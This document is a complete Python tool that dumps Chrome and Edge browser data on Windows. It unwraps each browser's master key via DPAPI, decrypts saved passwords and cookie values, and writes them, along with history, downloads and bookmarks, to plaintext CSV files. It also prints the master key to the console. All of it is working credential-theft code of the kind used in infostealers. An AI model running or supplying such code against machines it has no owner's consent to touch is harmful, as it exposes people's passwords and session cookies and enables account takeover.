#!/usr/bin/env python3
# Get Chrome Data
# v0.7 dev

import os
import re
import csv
import time
import json
import base64
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES

def get_master_key(local_state_path):
    with open(os.environ['USERPROFILE'] + os.sep + local_state_path, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

# Decrypt encrypted value in Chrome version < 80
def decrypt_value(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode() # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Error!"

# Decrypt encrypted value in Chrome all version 
def decrypt_value_all_version(encrypted_value, master_key):
    if encrypted_value[0:3] == b'v10':
        # Chrome > 80
        decrypted_value = decrypt_value(encrypted_value, master_key)
    else:
        # Chrome < 80
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
    return decrypted_value

# Turn timestamp to time
def timeStamp2time(timestamp):
    timestamp = timestamp // 1000000 - 11644473600
    if timestamp > 0:
        if len(str(timestamp)) > 10:
            timestamp = timestamp / 1000
        else:
            pass
        timeArray = time.localtime(timestamp)
        otherStyleTime = time.strftime("%Y-%m-%d %H:%M:%S", timeArray)
        return otherStyleTime
    else:
        return "Unknown"
 
def read_db(csv_path, csv_head, sql, master_key):
    conn = sqlite3.connect("temp")
    cursor = conn.cursor()
    with open(csv_path, 'w', newline = '', encoding = "utf-8-sig") as csv_file:
        try:
            cursor.execute(sql)
            csvwriter = csv.writer(csv_file, dialect=("excel"))
            csvwriter.writerow(csv_head)
            data = []
            for r in cursor.fetchall():
                for i in range(0, len(csv_head)):
                    if "time" in csv_head[i]:
                        info = timeStamp2time(r[i])
                    elif isinstance(r[i], bytes):
                        info = decrypt_value_all_version(r[i], master_key)
                    else:
                        info = r[i]
                    data.append(str(info) + '\t')
                csvwriter.writerow(data)
                data = []
            return 0
        except Exception as e:
            # raise e
            return 1
    cursor.close()
    conn.close()

# Get data in sqlite db
def get_db_data(db_path, csv_path, csv_head, sql, master_key = None):
    target_db = os.environ['USERPROFILE'] + os.sep + db_path
    shutil.copy2(target_db, "temp")
    print("[+] Get Data From " + target_db)
    status = read_db(csv_path, csv_head, sql, master_key)
    if status == 0:
        print("[*] Output In " + os.getcwd() + "\\" + csv_path)
    else:
        print("[!] Error !")
    try:
        os.remove("temp")
    except Exception as e:
        pass

# Get data in json
def get_json_data(json_path, csv_path, csv_head):
    target_json = os.environ['USERPROFILE'] + os.sep + json_path
    shutil.copy2(target_json, "temp")
    print("[+] Get Data From " + target_json)
    with open(csv_path, 'w', newline = '', encoding = "utf-8-sig") as csv_file:
        csvwriter = csv.writer(csv_file, dialect=("excel"))
        csvwriter.writerow(csv_head)
        with open("temp", 'r', encoding = "utf-8-sig") as f:
            json_data = f.read()
            data = []
            match_date_added = re.findall("\"date_added\": \"(.*?)\",([\s\S]*?)\"guid\": \"", json_data, re.S)
            match_name = re.findall("\"name\": \"(.*?)\",([\s\S]*?)\"type\": \"url\"", json_data, re.S)
            match_url = re.findall("\"url\": \"(.*?)\"", json_data, re.S)
            for i in range(0, len(match_url)):
                data.append(match_name[i][0])
                data.append(match_url[i])
                data.append(str(timeStamp2time(int(match_date_added[i][0]))) + '\t')
                csvwriter.writerow(data)
                data = []
    try:
        os.remove("temp")
    except Exception as e:
        pass

def main():
    # Target File Path
    TARGET_FILE_PATH = {
        "CHROME_LOCAL_STATE_FILE_PATH" : r"AppData\Local\Google\Chrome\User Data\Local State",
        "CHROME_PASSWORDS_DB_PATH"     : r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "CHROME_COOKIES_DB_PATH"       : r"AppData\Local\Google\Chrome\User Data\Default\Cookies",
        "CHROME_HISTORY_DB_PATH"       : r"AppData\Local\Google\Chrome\User Data\Default\History",
        "CHROME_BOOKMARKS_FILE_PATH"   : r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks",
        "EDGE_LOCAL_STATE_FILE_PATH"   : r"AppData\Local\Microsoft\Edge\User Data\Local State",
        "EDGE_PASSWORDS_DB_PATH"       : r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        "EDGE_COOKIES_DB_PATH"         : r"AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
        "EDGE_HISTORY_DB_PATH"         : r"AppData\Local\Microsoft\Edge\User Data\Default\History",
        "EDGE_BOOKMARKS_FILE_PATH"     : r"AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    }
    # Result File Path
    RESULT_FILE_PATH = {
        "CHROME_PASSWORD_CSV_PATH"  : "Results/Chrome_password.csv",
        "CHROME_COOKIES_CSV_PATH"   : "Results/Chrome_cookies.csv",
        "CHROME_HISTORY_CSV_PATH"   : "Results/Chrome_history.csv",
        "CHROME_DOWNLOADS_CSV_PATH" : "Results/Chrome_downloads.csv",
        "CHROME_BOOKMARKS_CSV_PATH" : "Results/Chrome_bookmarks.csv",
        "EDGE_PASSWORD_CSV_PATH"    : "Results/Edge_password.csv",
        "EDGE_COOKIES_CSV_PATH"     : "Results/Edge_cookies.csv",
        "EDGE_HISTORY_CSV_PATH"     : "Results/Edge_history.csv",
        "EDGE_DOWNLOADS_CSV_PATH"   : "Results/Edge_downloads.csv",
        "EDGE_BOOKMARKS_CSV_PATH"   : "Results/Edge_bookmarks.csv"
    }
    # Csv File Head
    CSV_FILE_HEAD = {
        "PASSOWRDS_CSV_HEAD" : ["url", "username", "password"],
        "COOKIES_CSV_HEAD"   : ["domain", "name", "cookies", "path", "is secure", "is httponly", "creation time", "expires time", "last access time"],
        "HISTORY_CSV_HEAD"   : ["url", "title", "visit count", "last visit time"],
        "DOWNLOADS_CSV_HEAD" : ["target path", "url", "size(byte)", "start time", "end time"],
        "BOOKMARKS_CSV_HEAD" : ["site name", "url", "create time"]
    }
    # Sql
    SQL = {
        "LOGIN_DATA_SQL" : "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;",
        "COOKIES_SQL"    : "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, creation_utc, expires_utc, last_access_utc FROM cookies;",
        "HISTORY_SQL"    : "SELECT url, title, visit_count, last_visit_time FROM urls;",
        "DOWNLOADS_SQL"  : "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
    }
    if not os.path.exists("Results/"):
        os.makedirs("Results/")
    if os.path.isfile(os.environ["USERPROFILE"] + os.sep + TARGET_FILE_PATH["CHROME_LOCAL_STATE_FILE_PATH"]):
        chrome_master_key = get_master_key(TARGET_FILE_PATH["CHROME_LOCAL_STATE_FILE_PATH"])
        print("******************************** Get Chrome Data ********************************")
        print("Chrome master key: " + str(chrome_master_key))
        # Get Chrome Passwords
        get_db_data(TARGET_FILE_PATH["CHROME_PASSWORDS_DB_PATH"], RESULT_FILE_PATH["CHROME_PASSWORD_CSV_PATH"], CSV_FILE_HEAD["PASSOWRDS_CSV_HEAD"], SQL["LOGIN_DATA_SQL"], chrome_master_key)
        # Get Chrome Cookies
        get_db_data(TARGET_FILE_PATH["CHROME_COOKIES_DB_PATH"], RESULT_FILE_PATH["CHROME_COOKIES_CSV_PATH"], CSV_FILE_HEAD["COOKIES_CSV_HEAD"], SQL["COOKIES_SQL"], chrome_master_key)
        # Get Chrome History
        get_db_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_HISTORY_CSV_PATH"], CSV_FILE_HEAD["HISTORY_CSV_HEAD"], SQL["HISTORY_SQL"])
        # Get Chrome Download History
        get_db_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_DOWNLOADS_CSV_PATH"], CSV_FILE_HEAD["DOWNLOADS_CSV_HEAD"], SQL["DOWNLOADS_SQL"])
        # Get Chrome Bookmarks
        get_json_data(TARGET_FILE_PATH["CHROME_BOOKMARKS_FILE_PATH"], RESULT_FILE_PATH["CHROME_BOOKMARKS_CSV_PATH"], CSV_FILE_HEAD["BOOKMARKS_CSV_HEAD"])
    if os.path.isfile(os.environ["USERPROFILE"] + os.sep + TARGET_FILE_PATH["EDGE_LOCAL_STATE_FILE_PATH"]):
        edge_master_key = get_master_key(TARGET_FILE_PATH["EDGE_LOCAL_STATE_FILE_PATH"])
        print("********************************* Get Edge Data *********************************")
        print("Edge master key: "+ str(edge_master_key))
        # Get Edge Passwords
        get_db_data(TARGET_FILE_PATH["EDGE_PASSWORDS_DB_PATH"], RESULT_FILE_PATH["EDGE_PASSWORD_CSV_PATH"], CSV_FILE_HEAD["PASSOWRDS_CSV_HEAD"], SQL["LOGIN_DATA_SQL"], edge_master_key)
        # Get Edge Cookies
        get_db_data(TARGET_FILE_PATH["EDGE_COOKIES_DB_PATH"], RESULT_FILE_PATH["EDGE_COOKIES_CSV_PATH"], CSV_FILE_HEAD["COOKIES_CSV_HEAD"], SQL["COOKIES_SQL"], edge_master_key)
        # Get Edge History
        get_db_data(TARGET_FILE_PATH["EDGE_HISTORY_DB_PATH"], RESULT_FILE_PATH["EDGE_HISTORY_CSV_PATH"], CSV_FILE_HEAD["HISTORY_CSV_HEAD"], SQL["HISTORY_SQL"])
        # Get Edge Download History
        get_db_data(TARGET_FILE_PATH["EDGE_HISTORY_DB_PATH"], RESULT_FILE_PATH["EDGE_DOWNLOADS_CSV_PATH"], CSV_FILE_HEAD["DOWNLOADS_CSV_HEAD"], SQL["DOWNLOADS_SQL"])
        # Get Edge Bookmarks
        get_json_data(TARGET_FILE_PATH["EDGE_BOOKMARKS_FILE_PATH"], RESULT_FILE_PATH["EDGE_BOOKMARKS_CSV_PATH"], CSV_FILE_HEAD["BOOKMARKS_CSV_HEAD"])
    

if __name__ == '__main__':
    main()
